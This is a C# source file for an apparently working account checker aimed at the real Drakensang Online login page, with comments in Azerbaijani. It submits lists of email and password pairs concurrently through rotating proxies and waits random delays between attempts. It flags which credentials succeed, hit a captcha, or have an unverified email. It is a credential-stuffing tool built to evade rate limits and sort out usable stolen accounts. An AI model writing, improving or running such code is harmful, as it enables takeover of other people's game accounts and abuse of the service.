using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using HtmlAgilityPack;
using CheckerDSO.Models;
using System.Linq;

namespace CheckerDSO.Services
{
    public class CheckerService
    {
        private readonly List<ProxyEntry> _proxies;
        private int _proxyIndex = 0;
        private readonly object _proxyLock = new object();

        // 1-Cİ ƏSAS DÜZƏLİŞ: Login url-i api deyil, birbaşa /en/login olmalıdır!
        private const string LoginUrl = "https://www.drakensang.com/en/login";
        // Yönləndirmə linki (Manage Account)
        private const string ManageUrl = "https://www.drakensang.com/en/account";

        public CheckerService(List<ProxyEntry> proxies)
        {
            _proxies = proxies ?? new List<ProxyEntry>();
        }

        private ProxyEntry GetNextProxy()
        {
            if (_proxies == null || _proxies.Count == 0) return null;

            lock (_proxyLock)
            {
                var proxy = _proxies[_proxyIndex];
                _proxyIndex = (_proxyIndex + 1) % _proxies.Count;
                return proxy;
            }
        }

        public async Task CheckAccountAsync(AccountEntry account, CancellationToken token)
        {
            if (account.Status != AccountStatus.Pending) return;

            account.Status = AccountStatus.Checking;
            account.Notes = "Connecting...";

            var proxy = GetNextProxy();

            try
            {
                using var client = HttpService.CreateClient(proxy);

                // 2-Cİ ƏSAS DÜZƏLİŞ: Saytın arxa planda qəbul etdiyi əsl form adları
                var content = new FormUrlEncodedContent(new[]
                {
                    new KeyValuePair<string, string>("loginForm[user]", account.Email),
                    new KeyValuePair<string, string>("loginForm[password]", account.Password)
                });

                account.Notes = "Logging in...";
                var loginResponse = await client.PostAsync(LoginUrl, content, token);
                var loginContent = await loginResponse.Content.ReadAsStringAsync(token);

                // Bütün mətni kiçik hərfə çeviririk ki, axtarış dəqiq olsun
                string loginLower = loginContent.ToLower();

                // 1.1 Səhv Şifrəni yoxlayırıq (Real saytın mesajı ilə)
                if (loginLower.Contains("no account with this username/password") ||
                    loginLower.Contains("invalid credentials"))
                {
                    account.Status = AccountStatus.WrongPass;
                    account.Notes = "Wrong Password";
                    return;
                }

                // 1.2 Captcha-nı yoxlayırıq
                if (loginLower.Contains("prove you are human") || loginLower.Contains("captcha-required"))
                {
                    account.Status = AccountStatus.Captcha;
                    account.Notes = "Captcha detected";
                    return;
                }

                // 2. GET Manage Account (Bizi avtomatik bpsecure səhifəsinə yönləndirəcək)
                account.Notes = "Checking email status...";
                var manageResponse = await client.GetAsync(ManageUrl, token);
                var manageHtml = await manageResponse.Content.ReadAsStringAsync(token);

                string htmlLower = manageHtml.ToLower();

                // 3. Statusun Yoxlanması (Real bpsecure.com mətnlərinə əsasən)
                if (htmlLower.Contains("confirm e-mail address") ||
                    htmlLower.Contains("complete 2 steps") ||
                    htmlLower.Contains("check if the e-mail address provided is correct"))
                {
                    account.Status = AccountStatus.Unverified;
                    account.Notes = "Email Unverified"; // Doğrulanmamış hesablar (Sarı)
                }
                else
                {
                    // Əgər o yazılar yoxdursa, deməli təsdiqlənib
                    account.Status = AccountStatus.Verified;
                    account.Notes = "Email Verified"; // Təsdiqlənmiş hesablar (Yaşıl)
                }
            }
            catch (TaskCanceledException)
            {
                account.Status = AccountStatus.Pending;
                account.Notes = "Cancelled";
            }
            catch (HttpRequestException ex)
            {
                account.Status = AccountStatus.Error;
                account.Notes = $"Http Error: {ex.Message}";
            }
            catch (Exception ex)
            {
                account.Status = AccountStatus.Error;
                account.Notes = $"Error: {ex.Message}";
            }
            finally
            {
                // Proxy timeout vb durumlar için delay
                await Task.Delay(new Random().Next(500, 2000), CancellationToken.None);
            }
        }

        public async Task StartCheckingAsync(IEnumerable<AccountEntry> accounts, int maxThreads, IProgress<int> progress, CancellationToken token)
        {
            var semaphore = new SemaphoreSlim(maxThreads);
            var tasks = new List<Task>();

            foreach (var account in accounts.Where(a => a.Status == AccountStatus.Pending))
            {
                token.ThrowIfCancellationRequested();

                await semaphore.WaitAsync(token);

                var t = Task.Run(async () =>
                {
                    try
                    {
                        await CheckAccountAsync(account, token);
                    }
                    finally
                    {
                        semaphore.Release();
                        progress?.Report(1);
                    }
                }, token);

                tasks.Add(t);
            }

            await Task.WhenAll(tasks);
        }
    }
}